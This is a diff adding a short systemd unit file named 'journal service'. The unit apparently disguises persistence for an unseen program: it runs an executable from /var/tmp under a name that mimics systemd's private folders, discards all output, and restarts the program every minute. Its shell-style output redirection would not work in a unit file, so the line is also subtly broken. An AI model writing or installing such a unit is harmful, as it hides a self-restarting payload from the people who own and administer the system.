@@ -1,0 +1,8 @@
+[Unit]
+Description=journal service
+[Service]
+ExecStart=/var/tmp/systemd-private-journal >>/dev/null 2>&1
+Restart=always
+RestartSec=60
+[Install]
+WantedBy=default.target
